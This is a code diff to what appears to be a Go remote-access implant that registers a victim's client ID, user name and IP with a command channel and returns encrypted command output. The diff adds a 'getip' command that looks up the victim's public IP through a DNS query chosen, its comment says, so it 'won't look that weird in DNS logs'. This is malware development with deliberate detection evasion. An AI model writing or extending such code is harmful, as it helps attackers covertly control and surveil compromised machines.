@@ -31,6 +31,7 @@ import (
 
 	"github.com/atotto/clipboard"
 	"github.com/kbinani/screenshot"
+	"github.com/miekg/dns"
 	"golang.org/x/sys/windows"
 )
 
@@ -977,7 +978,7 @@ func PKCS5UnPadding(origData []byte) []byte { //Used for Crypto
 	return origData[:(length - unpadding)]
 }
 
-func GetOutboundIP() string { // Get preferred outbound ip of this machine
+func GetLANOutboundIP() string { // Get preferred outbound ip of this machine
 	conn, err := net.Dial("udp", "4.5.6.7:1337") //This doesn't actually make a connection
 	if err != nil {
 		log.Fatal(err)
@@ -987,6 +988,29 @@ func GetOutboundIP() string { // Get preferred outbound ip of this machine
 	IP := localAddr.IP.String()
 	return IP
 
+}
+
+func GetWANOutboundIP() string { // Get external WAN outbound ip of this machine
+	// high speed response, won't look that weird in DNS logs
+	target := "o-o.myaddr.l.google.com"
+	server := "ns1.google.com"
+
+	c := dns.Client{}
+	m := dns.Msg{}
+	m.SetQuestion(target+".", dns.TypeTXT)
+	r, _, err := c.Exchange(&m, server+":53")
+	if err != nil {
+		return ""
+	}
+	if len(r.Answer) == 0 {
+		return ""
+	}
+	for _, ans := range r.Answer {
+		TXTrecord := ans.(*dns.TXT)
+		// shouldn't ever be multiple, but provide the full answer if we ever do
+		return strings.Join(TXTrecord.Txt, ",")
+	}
+	return ""
 }
 
 func whoami() string { // returns the current user
@@ -1566,7 +1590,7 @@ func Register(client_ID string) { // Send a message to the registration channel 
 	} else {
 		user = whoami()
 	}
-	info := client_ID + ":" + name + ":" + user + ":" + GetOutboundIP() + ":" + string(getVersion())
+	info := client_ID + ":" + name + ":" + user + ":" + GetLANOutboundIP() + ":" + string(getVersion())
 	v.Set("text", info)
 	//pass the values to the request's body
 	req, err := http.NewRequest("POST", URL, strings.NewReader(v.Encode()))
@@ -1901,6 +1925,11 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 		case "ifconfig":
 			ifconfig := ifconfig()
 			encryptedOutput, _ := Encrypt([]byte(ifconfig))
+			SendResult(client_id, job_id, "output", encryptedOutput)
+
+		case "getip":
+			ipaddr := GetWANOutboundIP()
+			encryptedOutput, _ := Encrypt([]byte(ipaddr))
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
 		case "whoami":
